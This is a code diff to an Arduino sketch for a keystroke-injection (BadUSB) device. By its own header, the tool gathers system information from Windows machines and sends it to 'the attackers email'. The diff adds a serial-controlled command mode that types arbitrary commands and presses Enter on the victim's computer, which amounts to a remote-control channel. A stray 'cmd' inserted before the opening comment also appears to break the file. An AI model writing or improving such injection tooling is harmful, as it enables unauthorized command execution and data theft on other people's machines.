@@ -1,4 +1,4 @@
-/*
+cmd/*
  * Created by ryspom, to get valuable system information and send it back to the attackers email.
  * It should work with windows 7, but it is only tested on windows 10 machines(works perfect!)
  */
@@ -82,7 +82,7 @@ void setup()
     delay(2000);
   
     openWindowsMenu();
-  
+    
     Keyboard.print("cmd");
     delay(1000);  // wait for the search to find cmd
   
@@ -141,8 +141,30 @@ void setup()
 void loop(){
   blinkLed();
     if (Serial1.available() > 0) {
-    String inChar = Serial1.readString();
-    Keyboard.print(inChar);
+    String serialstring = Serial1.readString();
+    String typeOfCommand = serialstring.substring(0,3);  // the first four letters indicate the type of the command(e.g. "wrt=")
+    String commandContent = serialstring.substring(3);  // all the letters after the fourth
+    char commandContentChar[commandContent.length()];
+    commandContent.toCharArray(commandContentChar,commandContent.length());
+    if(typeOfCommand=="cmd"){       // command mode. Types a command and then presses the Return key
+      Keyboard.print(commandContent);
+      typeKey(KEY_RETURN);   
+    }
+    else if(typeOfCommand=="prt"){  // print mode. Just prints the output wherever the cursor's at.
+      Keyboard.print(commandContent);
+    }
+    else if(typeOfCommand=="wrt"){  // write mode. Writes a single key, both a modifier and a letter/symbol one.
+      Keyboard.write(commandContentChar);
+    }
+    else if(typeOfCommand=="prs"){  // press mode. Presses a modifier Key(and does not release it until an rls comes.
+      Keyboard.press(commandContentChar);      
+    }
+    else if(typeOfCommand=="rls"){  // release mode. Releases all the pressed modifier keys.
+      Keyboard.releaseAll();
+    }
+    else{
+      Keyboard.print(serialstring);
+    }
+    
   }
 }
-
